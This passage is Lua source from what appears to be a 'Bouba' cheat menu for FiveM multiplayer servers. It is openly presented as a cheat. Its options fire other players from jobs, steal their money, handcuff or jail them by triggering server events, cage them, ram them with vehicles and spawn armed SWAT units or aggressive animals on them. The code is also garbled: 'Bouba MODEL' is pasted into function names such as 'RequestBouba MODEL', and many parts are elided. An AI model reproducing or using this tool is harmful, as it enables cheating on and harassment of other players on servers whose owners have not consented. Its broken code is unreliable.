					elseif Misc.Button("Fire player from job (~g~ESX~s~)") then
				    FirePlayer(SelectedPlayer)
                    elseif Misc.Button("ESX Give Money To Player From Your Wallet") then
                    ...
                    elseif Misc.Button("ESX Steal Money From Player") then
                    ...
                    elseif Misc.Button("ESX Handcuff Player") then
                        TriggerServerEvent("esx_policejob:handcuff",GetPlayerServerId(selectedPlayer))
                    elseif Misc.Button("ESX Send To Jail") then
                    ...
                    elseif Misc.Button("ESX Get Out Of Jail") then
                    ...
                    Misc.Display()
                elseif Misc.IsMenuOpened("PlayerBouba Bouba ESXJobMenu") then
                    if Misc.Button("Unemployed") then
                    ...
                    Misc.Display()
                elseif Misc.IsMenuOpened("Bouba PlayerTrollMenu") then
                    if Misc.Button ("Fake Chat Message") then
				...
				elseif Misc.Button("Ram w/ Custom Vehicle") then
				local cPs = KeyboardInput('Are you sure you want to ram the player? y/n', '', 0)
				if cPs == 'y' then
						local Bouba MODELName1 = KeyboardInput("Enter Vehicle Name", "", 100)
				        if Bouba MODELName1 and IsBouba MODELValid(Bouba MODELName1) and IsBouba MODELAVehicle(Bouba MODELName1) then
                        local Bouba MODEL = GetHashKey(Bouba MODELName1)
                        RequestBouba MODEL(Bouba MODEL)
                        while not HasBouba MODELLoaded(Bouba MODEL) do
                            Citizen.Wait(0)
                        end
                        ...
                        if HasBouba MODELLoaded(Bouba MODEL) then
                            local veh = CreateVehicle(Bouba MODEL, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)	
                            SetVehicleForwardSpeed(veh, 120.0)		
                        end		
											                    else
                        drawNotification("~r~Bouba MODEL Isn't Valid You Tard")
						end
						elseif cPs == 'n' then
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                ...
                elseif Misc.Button('~r~ISIS Explode') then
                ...
                elseif Misc.Button('~r~Cage ~s~Player') then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    ...
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
                elseif Misc.Button('Wall ~s~Player') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = -145066854
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                ...
                elseif Misc.Button('Wall ~s~Player Car') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = -145066854
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                ...
                elseif Misc.Button('Fuck Up ~s~Player') then
                    j = true
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    ...
                    RequestBouba MODEL(ef)
                    RequestBouba MODEL(smashhash)
                    while not HasBouba MODELLoaded(ef) do
                        Citizen.Wait(0)
                    end
                    ...
                    for i = 0, 10 do
                        ...
                        RequestBouba MODEL(eh)
                        Citizen.Wait(50)
                        if HasBouba MODELLoaded(eh) then
                            local ped =
                                CreatePed(
                                21,
                                eh,
				...
				elseif Misc.Button("Spawn Mountain Lion") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 10 do
                ...
                elseif Misc.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "WEAPON_ASSAULTRIFLE"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestBouba MODEL(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasBouba MODELLoaded(GetHashKey(bQ)) then
                            local ped =
					...
					elseif Misc.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_rpg"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                ...
                elseif Misc.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
                    local bQ = "s_m_y_swat_01"
                ...
                elseif Misc.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_railgun"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
					...
					elseif Misc.Button("Rain Agressive NPC") then
                    ...
                    elseif Misc.MenuButton("~r~→  ~s~Spawn Props On Player", "SpawnPropsMenu") then
                    elseif Misc.CheckBox(
                        "Freeze Player",
                        freezePlayer,
                        function(enabled)
                    ...
                    Misc.Display()
                elseif Misc.IsMenuOpened("SpawnPropsMenu") then
                    if Misc.CheckBox(
                    ...
                    then
                    elseif Misc.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
                        currentBone = currentIndex
                        selectedBone = selectedIndex
                    end)
                    then
                    elseif Misc.Button("Weed") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif Misc.Button("Windmill") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif Misc.Button("Custom Prop") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local input = KeyboardInput("Enter Prop Name", "", 100)
                        if IsBouba MODELValid(input) then
                            ...
                            drawNotification("Invalid Bouba MODEL!")
                        end
                    end

                    Misc.Display()
            elseif Misc.IsMenuOpened("VehicleRamMenu") then
                if Misc.Button("Futo") then
                    local Bouba MODEL = GetHashKey("futo")
                    RequestBouba MODEL(Bouba MODEL)
                    while not HasBouba MODELLoaded(Bouba MODEL) do
                        Citizen.Wait(0)
                    end
                ...
                elseif Misc.Button("Bus") then
                    local Bouba MODEL = GetHashKey("bus")
                    RequestBouba MODEL(Bouba MODEL)
                    while not HasBouba MODELLoaded(Bouba MODEL) do
                        Citizen.Wait(0)
                    end
                    ...
                    Misc.Display()
            elseif Misc.IsMenuOpened("SingleWepPlayer") then
                for i = 1, #allWeapons do
                    if Misc.Button(allWeapons[i]) then
                ...
                Misc.Display()
            elseif Misc.IsMenuOpened("Bouba WeaponMenu") then
                if Misc.MenuButton("~r~→  ~s~Single Weapon Spawner", "SingleBouba WeaponMenu") then
                elseif Misc.Button("Give All Weapons") then
                    for i = 1, #allWeapons do
                ...
                then
                elseif Misc.MenuButton("~r~→  ~s~Weapon Customization", "WeaponCustomization") then
                elseif Misc.MenuButton("~r~→  ~s~Bullet Gun Options", "BulletGunMenu") then
                end

                Misc.Display()
            elseif Misc.IsMenuOpened("WeaponCustomization") then
                if Misc.CheckBox(
                    "Rainbow Tint",
                    rainbowTint,
                    function(enabled)
                ...
                then
                elseif Misc.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
                ...
                then
                elseif Misc.Button("~g~Add Special Finish") then
                ...
                elseif Misc.Button("~r~Remove Special Finish") then
                ...
                elseif Misc.Button("~g~Add Suppressor") then
                ...
                elseif Misc.Button("~r~Remove Suppressor") then
                ...
                elseif Misc.Button("~g~Add Scope") then
                ...
                elseif Misc.Button("~r~Remove Scope") then
                ...
                Misc.Display()
            elseif Misc.IsMenuOpened("BulletGunMenu") then
                if Misc.CheckBox(
                    "Vehicle Gun",
                    vehicleGun,
                    function(enabled)
                ...
                then
                elseif Misc.ComboBox("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(currentIndex, selectedIndex)
                    currentVehicle = currentIndex
                    selectedVehicle = selectedIndex

                end)
                then
                elseif Misc.ComboBox("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(currentIndex, selectedIndex)
                ...
                then
                elseif Misc.ComboBox("Ped To Shoot", peds, currentPed, selectedPed, function(currentIndex, selectedIndex)
                ...
                then
                elseif Misc.ComboBox("Bullet", bullets, currentBullet, selectedBullet, function(currentIndex, selectedIndex)
                ...
                Misc.Display()
            elseif Misc.IsMenuOpened("SingleBouba WeaponMenu") then
                for i = 1, #allWeapons do
                    if Misc.Button(allWeapons[i]) then
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250, false, false)
                    end
            ...
            elseif IsDisabledControlPressed(0, 178) then
                if planeisbest then
                    trynaskidhuh("Bouba MainMenu")
                else
                    local temp = KeyboardInput("Enter Password", "Misc", 100)
                    if temp == dEI then
